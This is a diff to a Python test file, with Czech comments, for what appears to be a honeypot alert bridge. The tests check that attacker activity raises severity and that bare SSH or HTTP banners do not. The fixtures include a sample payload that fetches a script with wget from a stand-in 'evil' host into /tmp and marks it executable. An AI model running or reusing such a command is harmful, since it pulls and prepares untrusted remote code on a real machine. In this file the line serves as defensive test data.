@@ -30,7 +30,8 @@ def test_severity_is_configurable(monkeypatch):
 @pytest.mark.parametrize("extra", [
     {"credentials": "root:123456"},
     {"commands": "wget http://evil/x.sh"},
-    {"payload": "..."},
+    {"payload": "cd /tmp; wget http://evil/x.sh; chmod +x x.sh"},
+    {"payload": "A" * 250},
 ])
 def test_notable_hit_is_raised(monkeypatch, extra):
     """Az kdyz utocnik neco dokaze, je to udalost — ne pouhy sken."""
@@ -52,3 +53,20 @@ def test_public_ip_stays_low(monkeypatch, ip):
     """Okoli rozsahu 172.16-31 se nesmi chytat omylem."""
     monkeypatch.setattr(_conf, "SENTINEL_HIT_SEVERITY", "low", raising=False)
     assert bridge._translate(_hit(src_ip=ip))["severity"] == "low"
+
+
+@pytest.mark.parametrize("payload", [
+    "[ssh=SSH-2.0-libssh_0.9.6] SSH-2.0-libssh_0.9.6\n",
+    "GET /admin HTTP/1.1",
+    "HTTP/1.1",
+    "",
+])
+def test_banner_is_not_interaction(monkeypatch, payload):
+    """KAZDY zachyt ma payload — i holy banner. Jeho pritomnost nic neznamena.
+
+    Prvni verze brala `payload` jako znamku interakce, takze by se jako
+    neobvykly oznacil uplne kazdy zasah a zmena by byla k nicemu. Vzorek je
+    skutecny radek z provozni databaze.
+    """
+    monkeypatch.setattr(_conf, "SENTINEL_HIT_SEVERITY", "low", raising=False)
+    assert bridge._translate(_hit(payload=payload))["severity"] == "low"
